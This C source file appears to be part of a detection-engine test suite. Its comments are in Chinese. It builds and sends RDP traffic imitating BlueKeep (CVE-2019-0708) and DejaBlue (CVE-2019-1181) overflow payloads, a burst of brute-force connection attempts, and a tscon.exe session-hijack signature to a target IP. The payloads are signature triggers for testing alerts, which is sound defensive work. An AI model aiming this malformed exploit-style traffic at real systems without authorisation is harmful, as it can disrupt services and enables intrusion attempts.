/**
 * @file    attack_rdp.c
 * @brief   RDP 协议攻击模拟测试
 *
 * 覆盖规则:
 *   VDE-003  BlueKeep CVE-2019-0708 (MS_T120 通道 UAF)
 *   VDE-004  DejaBlue CVE-2019-1181 (堆溢出)
 *   VDE-013  RDP 暴力破解 (THRESHOLD)
 *   VDE-058  RDP 会话劫持 (tscon.exe)
 */

#include "../include/attack_common.h"

/* =========================================================
 *  RDP 数据包构造
 * ========================================================= */

/**
 * TPKT + X.224 Connection Request (CR)
 * 含 Cookie: mstshash=<用户名> 和 MS_T120 通道绑定请求
 * BlueKeep 利用时会在 MS_T120 通道发送异常大载荷
 */
static const uint8_t RDP_BLUEKEEP_CR[] = {
    /* TPKT Header */
    0x03, 0x00,              /* Version=3, Reserved=0 */
    0x00, 0x2C,              /* Length = 44 */
    /* X.224 CR TPDU */
    0x27,                    /* Length indicator */
    0xE0,                    /* CR PDU code */
    0x00, 0x00,              /* DST-REF */
    0x00, 0x00,              /* SRC-REF */
    0x00,                    /* Class option */
    /* Cookie: mstshash=Administr */
    0x43, 0x6F, 0x6F, 0x6B, 0x69, 0x65, 0x3A, 0x20,
    0x6D, 0x73, 0x74, 0x73, 0x68, 0x61, 0x73, 0x68,
    0x3D, 0x41, 0x64, 0x6D, 0x69, 0x6E, 0x69, 0x73,
    0x74, 0x72, 0x0D, 0x0A,
    /* RDP Negotiation Request */
    0x01,                    /* TYPE_RDP_NEG_REQ */
    0x00,                    /* Flags */
    0x08, 0x00,              /* Length */
    0x03, 0x00, 0x00, 0x00   /* requestedProtocols: PROTOCOL_SSL | PROTOCOL_HYBRID */
};

/**
 * BlueKeep MS_T120 通道绑定 + 异常大载荷
 * 在 MCS Connect Initial 中绑定 MS_T120 通道
 */
static uint8_t rdp_bluekeep_payload[2048];
static int build_rdp_bluekeep_payload(void) {
    memset(rdp_bluekeep_payload, 0, sizeof(rdp_bluekeep_payload));
    /* TPKT */
    rdp_bluekeep_payload[0] = 0x03;
    rdp_bluekeep_payload[1] = 0x00;
    rdp_bluekeep_payload[2] = 0x07; /* Length High */
    rdp_bluekeep_payload[3] = 0xFF; /* Length Low = 2047 */
    /* X.224 Data TPDU */
    rdp_bluekeep_payload[4] = 0x02;
    rdp_bluekeep_payload[5] = 0xF0;
    rdp_bluekeep_payload[6] = 0x80;
    /* MCS Connect Initial BER */
    rdp_bluekeep_payload[7]  = 0x7F;
    rdp_bluekeep_payload[8]  = 0x65;
    /* MS_T120 channel name */
    const char* ms_t120 = "MS_T120\x00";
    memcpy(rdp_bluekeep_payload + 64, ms_t120, 8);
    /* 填充大量数据触发 UAF */
    memset(rdp_bluekeep_payload + 128, 0x41, 1900);
    return 2047;
}

/**
 * DejaBlue CVE-2019-1181 - RDP Data PDU 堆溢出
 * 通过 Dynamic Virtual Channel 发送超大数据包
 */
static uint8_t rdp_dejablue_payload[4096];
static int build_rdp_dejablue_payload(void) {
    memset(rdp_dejablue_payload, 0, sizeof(rdp_dejablue_payload));
    /* TPKT */
    rdp_dejablue_payload[0] = 0x03;
    rdp_dejablue_payload[1] = 0x00;
    rdp_dejablue_payload[2] = 0x0F; /* High */
    rdp_dejablue_payload[3] = 0xFF; /* Low = 4095 */
    /* X.224 */
    rdp_dejablue_payload[4] = 0x02;
    rdp_dejablue_payload[5] = 0xF0;
    rdp_dejablue_payload[6] = 0x80;
    /* MCS Send Data Indication */
    rdp_dejablue_payload[7]  = 0x68;
    rdp_dejablue_payload[8]  = 0x00;
    /* PDU Type = 0x04 (Data PDU) */
    rdp_dejablue_payload[16] = 0x04;
    rdp_dejablue_payload[17] = 0x00;
    /* 填充溢出数据 */
    memset(rdp_dejablue_payload + 32, 0x42, 4063);
    return 4095;
}

/**
 * RDP SYN 包（用于暴力破解模拟）
 * 实际只需建立 TCP 连接即可触发阈值
 */

/**
 * tscon.exe 会话劫持特征包
 */
static const uint8_t RDP_TSCON_HIJACK[] = {
    0x03, 0x00, 0x00, 0x20,
    0x02, 0xF0, 0x80,
    /* 包含 tscon.exe 字符串 */
    0x74, 0x73, 0x63, 0x6F, 0x6E, 0x2E, 0x65, 0x78, 0x65, /* tscon.exe */
    0x00, 0x20, 0x31, 0x20,  /* " 1 " (session ID) */
    0x2F, 0x64, 0x65, 0x73, 0x74, 0x3A, 0x63, 0x6F, 0x6E, 0x73, 0x6F, 0x6C, 0x65  /* /dest:console */
};

/* =========================================================
 *  测试函数
 * ========================================================= */

static void test_bluekeep(const char* target_ip, TestStats* stats) {
    PRINT_INFO("=== VDE-003 BlueKeep CVE-2019-0708 ===");
    stats->total++;

    sock_t s = tcp_connect(target_ip, 3389, 3000);
    if (s == INVALID_SOCK) {
        /* 降级 UDP */
        int plen = build_rdp_bluekeep_payload();
        sock_t u = udp_socket();
        if (u != INVALID_SOCK) {
            udp_send(u, target_ip, 3389, RDP_BLUEKEEP_CR, sizeof(RDP_BLUEKEEP_CR));
            SLEEP_MS(100);
            udp_send(u, target_ip, 3389, rdp_bluekeep_payload, plen);
            CLOSE_SOCK(u);
            PRINT_SEND("BlueKeep CR + MS_T120 大载荷已发送（UDP，%d bytes）", plen);
            stats->sent++;
        }
        return;
    }

    /* 发送 Connection Request */
    if (tcp_send_all(s, RDP_BLUEKEEP_CR, sizeof(RDP_BLUEKEEP_CR)) > 0) {
        PRINT_SEND("RDP Connection Request (含 mstshash Cookie) 已发送");
        SLEEP_MS(500);
        uint8_t resp[256];
        tcp_recv(s, resp, sizeof(resp), 2000);
    }

    /* 发送 MS_T120 异常大载荷 */
    int plen = build_rdp_bluekeep_payload();
    if (tcp_send_all(s, rdp_bluekeep_payload, plen) > 0) {
        PRINT_SEND("BlueKeep MS_T120 大载荷已发送 (%d bytes)", plen);
        stats->sent++;
        PRINT_OK("VDE-003 流量已发送，等待检测引擎告警");
    }

    CLOSE_SOCK(s);
}

static void test_dejablue(const char* target_ip, TestStats* stats) {
    PRINT_INFO("=== VDE-004 DejaBlue CVE-2019-1181 ===");
    stats->total++;

    int plen = build_rdp_dejablue_payload();

    sock_t s = tcp_connect(target_ip, 3389, 3000);
    if (s == INVALID_SOCK) {
        sock_t u = udp_socket();
        if (u != INVALID_SOCK) {
            udp_send(u, target_ip, 3389, rdp_dejablue_payload, plen);
            CLOSE_SOCK(u);
            PRINT_SEND("DejaBlue 堆溢出载荷已发送（UDP，%d bytes）", plen);
            stats->sent++;
        }
        return;
    }

    /* 先发送正常 CR */
    tcp_send_all(s, RDP_BLUEKEEP_CR, sizeof(RDP_BLUEKEEP_CR));
    SLEEP_MS(500);
    uint8_t resp[256];
    tcp_recv(s, resp, sizeof(resp), 2000);

    /* 发送 DejaBlue 大载荷 */
    if (tcp_send_all(s, rdp_dejablue_payload, plen) > 0) {
        PRINT_SEND("DejaBlue Data PDU 堆溢出载荷已发送 (%d bytes)", plen);
        stats->sent++;
        PRINT_OK("VDE-004 流量已发送，等待检测引擎告警");
    }

    CLOSE_SOCK(s);
}

static void test_rdp_brute_force(const char* target_ip, TestStats* stats) {
    PRINT_INFO("=== VDE-013 RDP 暴力破解 (THRESHOLD) ===");
    stats->total++;

    int sent_count = 0;
    /* 快速发送 12 次 SYN 连接尝试（超过阈值 8次/10s） */
    for (int i = 0; i < 12; i++) {
        sock_t s = tcp_connect(target_ip, 3389, 500);
        if (s != INVALID_SOCK) {
            /* 立即关闭，模拟认证失败 */
            CLOSE_SOCK(s);
        } else {
            /* 目标不可达时，通过 UDP 发送 TPKT 特征包 */
            sock_t u = udp_socket();
            if (u != INVALID_SOCK) {
                udp_send(u, target_ip, 3389, RDP_BLUEKEEP_CR, sizeof(RDP_BLUEKEEP_CR));
                CLOSE_SOCK(u);
            }
        }
        sent_count++;
        SLEEP_MS(200);
    }

    PRINT_SEND("已发送 %d 次 RDP 连接尝试（模拟暴力破解）", sent_count);
    stats->sent++;
    PRINT_OK("VDE-013 阈值触发流量已发送");
}

static void test_rdp_session_hijack(const char* target_ip, TestStats* stats) {
    PRINT_INFO("=== VDE-058 RDP 会话劫持 (tscon.exe) ===");
    stats->total++;

    sock_t u = udp_socket();
    if (u != INVALID_SOCK) {
        udp_send(u, target_ip, 3389, RDP_TSCON_HIJACK, sizeof(RDP_TSCON_HIJACK));
        CLOSE_SOCK(u);
        PRINT_SEND("RDP tscon.exe 会话劫持特征包已发送");
        stats->sent++;
        PRINT_OK("VDE-058 流量已发送");
    }
}

/* =========================================================
 *  RDP 测试入口
 * ========================================================= */
void run_rdp_attacks(const char* target_ip, TestStats* stats) {
    printf("\n");
    PRINT_INFO("########################################");
    PRINT_INFO("  RDP 协议攻击模拟测试");
    PRINT_INFO("  目标: %s:3389", target_ip);
    PRINT_INFO("########################################");

    test_bluekeep(target_ip, stats);           SLEEP_MS(500);
    test_dejablue(target_ip, stats);           SLEEP_MS(500);
    test_rdp_brute_force(target_ip, stats);    SLEEP_MS(500);
    test_rdp_session_hijack(target_ip, stats); SLEEP_MS(500);
}
